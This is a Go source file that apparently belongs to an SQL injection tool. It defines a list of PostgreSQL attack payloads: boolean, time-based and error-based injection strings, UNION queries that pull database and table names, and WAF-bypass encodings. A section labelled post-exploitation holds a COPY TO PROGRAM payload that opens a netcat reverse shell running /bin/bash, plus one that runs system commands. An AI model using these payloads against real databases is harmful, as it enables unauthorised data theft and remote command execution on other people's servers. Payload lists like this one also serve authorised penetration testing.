package payloads

var PostgreSQL = PayloadGroup{
	DBMS: "PostgreSQL",
	Payloads: []Payload{
		// WAF Bypass & Deep
		{Type: "deep", Content: "' UNION SELECT string_agg(datname, ','),NULL FROM pg_database--"},
		{Type: "error", Content: "'; CREATE OR REPLACE FUNCTION bypass() RETURNS void AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT bypass();--"},
		{Type: "error", Content: "1' || (SELECT 'a' FROM pg_sleep(5)) || '1"},

		// New Effective Payloads
		{Type: "boolean", Content: "' AND 1=1--"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--"},
		{Type: "time", Content: "'; SELECT pg_sleep(5)--"},
		{Type: "time", Content: "' AND (SELECT 2144 FROM pg_sleep(5))--"},
		{Type: "error", Content: "'; SELECT CAST('a' AS NUMERIC)--"},
		{Type: "error", Content: "'; SELECT 1/0--"},

		// ADVANCED POSTGRESQL PAYLOADS
		{Type: "error", Content: "'; SELECT CAST(VERSION() AS INT)--"},
		{Type: "error", Content: "'; SELECT CAST(USER AS INT)--"},
		{Type: "error", Content: "'; SELECT CAST(CURRENT_DATABASE() AS INT)--"},
		{Type: "error", Content: "'; SELECT 1 FROM (SELECT COUNT(*), (SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public') FROM pg_class GROUP BY 2) AS x--"},

		// TIME-BASED ADVANCED
		{Type: "time", Content: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"},
		{Type: "time", Content: "'; SELECT (SELECT 1 FROM pg_sleep(5))--"},

		// BOOLEAN-BASED ADVANCED
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--"},
		{Type: "boolean", Content: "' AND (SELECT version()) LIKE 'PostgreSQL%'--"},

		// WAF BYPASS
		{Type: "error", Content: "'%20OR%201=1--"},
		{Type: "error", Content: "';/**/SELECT/**/1--"},
		{Type: "error", Content: "';%0ASELECT%0A1--"},

		// POST-EXPLOITATION
		{Type: "deep", Content: "'; COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash 127.0.0.1 4444'--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out;--"},
	},
}
